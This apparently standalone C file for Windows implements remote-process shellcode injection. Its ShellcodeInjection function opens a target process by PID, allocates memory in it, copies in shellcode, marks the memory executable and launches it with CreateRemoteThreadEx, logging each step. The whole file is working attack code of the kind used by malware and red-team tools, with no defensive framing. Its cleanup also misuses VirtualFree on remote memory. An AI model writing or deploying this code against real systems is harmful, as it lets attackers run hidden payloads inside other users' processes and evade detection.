#pragma once

#include <stdio.h>
#include <windows.h>
#include "injection.h"

/*
ShellcodeInjection(DWORD PID,		; Process ID
const unsigned char* shellcode,		; ShellCode
size_t shellcodeSize);				; Size Of Shellcode
*/
BOOL ShellcodeInjection(DWORD PID, unsigned char* shellcode, size_t shellcodeSize) {
	DWORD TID = NULL;
	LPVOID buffer = NULL;
	DWORD lpflOldProtect = 0;

	HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (pHandle == NULL) {
		yapBad("Cannot get handle to the PID");
		return FALSE;
	}
	yapOkay("Got a handle [0x%p] for the process [%ld]", pHandle, PID);
	Sleep(1000);

	buffer = VirtualAllocEx(pHandle, NULL, shellcodeSize, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
	if (buffer == NULL) {
		yapBad("Unable to allocate memory for the buffer");
		CloseHandle(pHandle); // Close the handle to the process on failing
		return FALSE;
	}
	yapOkay("Allocated buffer at [0x%p] ", buffer);
	Sleep(1000);

	if (!WriteProcessMemory(pHandle, buffer, shellcode, shellcodeSize, 0)) {
		yapBad("There was an error copying shellcode to the memory");
		VirtualFree(buffer, 0, MEM_RELEASE); // Release the allocated memory.
		CloseHandle(pHandle);
		return FALSE;
	}
	yapOkay("Copied the shellcode into buffer at [0x%p]", buffer);
	Sleep(1000);

	if (!VirtualProtectEx(pHandle, buffer, shellcodeSize, PAGE_EXECUTE_READ, &lpflOldProtect)) { // Change the permissions of memory region later
		yapBad("There was an error changing protection of the memory allocated at [0x%p]", buffer);
		VirtualFree(buffer, 0, MEM_RELEASE);
		CloseHandle(pHandle);
		return FALSE;
	}
	yapOkay("Changed the protection of memory allocated at [0x%p]", buffer);
	Sleep(1000);

	HANDLE tHandle = CreateRemoteThreadEx(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, 0, &TID);
	if (tHandle == NULL) {
		yapBad("There was an error creating a remote thread");
		VirtualFree(buffer, 0, MEM_RELEASE);
		CloseHandle(pHandle);
		return FALSE;
	}
	yapOkay("Created a thread [%ld] and got the handle [0x%p]", TID, tHandle);
	Sleep(1000);
	yapWarn("Waiting for thread [%ld] to finish execution", TID);
	Sleep(1000);
	WaitForSingleObject(tHandle, INFINITE);
	yapWarn("Thread [%ld] finished execution. Cleaning up memory and closing handles", TID);
	Sleep(1000);

	VirtualFree(buffer, 0, MEM_RELEASE);
	CloseHandle(pHandle);
	CloseHandle(tHandle);

	return TRUE;
}